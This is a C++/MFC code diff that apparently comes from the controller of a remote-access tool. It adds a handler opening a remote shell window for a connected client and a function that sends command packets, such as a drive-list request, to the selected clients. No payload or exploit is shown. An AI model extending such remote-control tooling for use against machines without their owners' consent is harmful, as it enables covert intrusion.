@@ -70,6 +70,7 @@ BEGIN_MESSAGE_MAP(CPrincDlg, CDialogEx)
 	ON_WM_SIZE()
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
+	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 END_MESSAGE_MAP()
 
 
@@ -391,4 +392,28 @@ LRESULT CPrincDlg::OnRemoveFromList(WPARAM wParam , LPARAM lParam)
 	m_ListDlg.RemoveFromList(pContext);
 	AfxMessageBox(_T("aaaaaaaaa"));
 	return 0;
+}
+LRESULT CPrincDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	//ShellDlg	*dlg = new ShellDlg(this, m_iocpServer, pContext);
+	m_ShellDlg.SetClient(m_iocpServer,pContext);
+	m_ShellDlg.ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SHELL_DLG;
+	pContext->m_Dialog[1] = (int)m_ShellDlg.m_hWnd;
+	return 0;
+}
+void CPrincDlg::SendSelectCommand(PBYTE pData, UINT nSize)
+{
+	POSITION pos = m_ListDlg.m_cListCtrl.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
+	while(pos) //so long as we have a valid POSITION, we keep iterating
+	{
+		int	nItem = m_ListDlg.m_cListCtrl.GetNextSelectedItem(pos);
+		ClientContext* pContext = (ClientContext*)m_ListDlg.m_cListCtrl.GetItemData(nItem);
+		// 发送获得驱动器列表数据包
+		m_iocpServer->Send(pContext, pData, nSize);
+
+		//Save the pointer to the new item in our CList
+	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory	
 }
